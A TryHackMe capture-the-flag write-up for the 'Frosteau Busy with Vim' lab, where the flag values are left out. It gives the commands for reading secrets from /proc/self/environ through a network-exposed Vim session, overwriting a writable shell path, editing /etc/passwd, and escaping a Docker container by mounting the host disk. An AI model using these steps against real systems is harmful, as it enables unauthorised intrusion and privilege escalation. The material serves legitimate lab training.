# TryHackMe - Frosteau Busy with Vim

> *These notes were written with AI assistance for English clarity. Attack paths and commands reflect my own work on the room.*

**Difficulty:** Hard  
**Category:** Vim, Docker escape, Telnet services  
**Room:** [Frosteau Busy with Vim](https://tryhackme.com/room/busyvimfrosteau)  
**Access:** Hidden QR code in AoC Day 12

## Introduction

Advent of Cyber '23 — Side Quest 3. Multiple telnet services expose FTP-like file transfer, an interactive Vim session, and eventually a busybox shell — all inside a container that can be escaped to the host.

**Objectives:**
- Collect four progressive flags
- Retrieve `yetikey3.txt` from the host filesystem

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Typical ports:

| Port | Service |
|------|---------|
| 8065 | Telnet → busybox shell (closed initially) |
| 8075 | Telnet → FTP-like file download |
| 8085 | Telnet → interactive **Vim** |
| 8095 | Telnet → nano (bonus) |

The unusual telnet+Vim combination is the core attack surface.

---

## Enumeration

### Port 8075 — FTP-like service

Connect via telnet:

```bash
telnet <TARGET_IP> 8075
```

Available commands:

```
ls
get flag-1-of-4.txt
quit
```

Download `flag-2-of-4.sh` as well — it hints that flag 2 lives in an environment variable.

### Port 8085 — Vim session

Connecting drops you directly into Vim. From here you can read files, explore the filesystem (`:Ex`), and execute commands including `:py3`.

---

## Exploitation

### Flag 1 — Direct download

```bash
telnet <TARGET_IP> 8075
get flag-1-of-4.txt
quit
cat flag-1-of-4.txt
```

Submit on TryHackMe.

---

### Flag 2 — Environment variable via Vim

The script from port 8075 indicates flag 2 is in `$FLAG2`.

In Vim on port 8085:

```
:echo $FLAG2
```

Alternative:

```
:e /proc/self/environ
```

---

### Flag 3 — Busybox shell escape

#### Filesystem exploration in Vim

```
:Ex
```

Key paths:
- `/etc/file/busybox` — busybox binary
- `/usr/frosty/sh` — **writable executable** shell path
- `/proc/self/environ` — confirms container/busybox environment
- Port 8065 opens after successful exploit

#### Method A — Busybox shebang (simplest)

Edit `/usr/frosty/sh` in Vim:

```
:e /usr/frosty/sh
```

Insert mode (`i`):

```bash
#!/etc/file/busybox
sh
```

Force save:

```
:wq!
```

Reconnect on port **8065**:

```bash
telnet <TARGET_IP> 8065
```

Useful alias:

```bash
alias bb=/etc/file/busybox
bb cat /root/flag-3-of-4.txt
```

#### Method B — Static bash upload (alternative)

1. Upload static bash via port 8075
2. Copy into `/usr/frosty/sh` using Vim `:py3`
3. Upload static `chmod`, make executable
4. Modify `/etc/passwd` to point root's shell to your binary
5. Reconnect on 8065

---

## Post-exploitation

### Flag 4 + yetikey3 — Docker escape to host

From the busybox shell:

```bash
bb fdisk -l
# /dev/xvda1 = host root partition

bb mkdir /mnt
bb mount -o rw /dev/xvda1 /mnt
bb ls /mnt/root
bb cat /mnt/root/flag-4-of-4.txt
bb cat /mnt/root/yetikey3.txt
```

Mounting the host partition exposes the real `/root` outside the container.

---

## Useful Vim commands

| Command | Action |
|---------|--------|
| `:Ex` | File explorer |
| `:e /path` | Open file |
| `:echo $VAR` | Read environment variable |
| `:py3 ...` | Execute Python (binary upload) |
| `:r /tmp/ftp/file` | Read file into buffer |
| `:wq!` | Force save read-only files |
| `ggdG` | Delete all lines |

Reference: https://vim.rtorr.com/

---

## Flags

| Flag | Path |
|------|------|
| 1 | FTP download on port 8075 |
| 2 | `$FLAG2` via Vim `:echo` |
| 3 | busybox shell → `/root/flag-3-of-4.txt` |
| 4 | Host mount → `/mnt/root/flag-4-of-4.txt` |
| yetikey3 | Host mount → `/mnt/root/yetikey3.txt` |

*Values intentionally omitted. Complete the room on [TryHackMe](https://tryhackme.com/room/busyvimfrosteau).*

---

## Conclusion

### What I learned

| Concept | Detail |
|---------|--------|
| Vim as attack surface | Shell spawn, file R/W, `:py3` execution |
| Busybox containers | Single binary provides most utilities |
| Writable shell path | Replace `/usr/frosty/sh` to gain execution |
| Docker escape | Mount host partition `/dev/xvda1` |
| `/proc/self/environ` | Leaks secrets from process environment |

A creative room proving that exposing Vim over the network is equivalent to handing attackers a remote editor with root-adjacent capabilities.
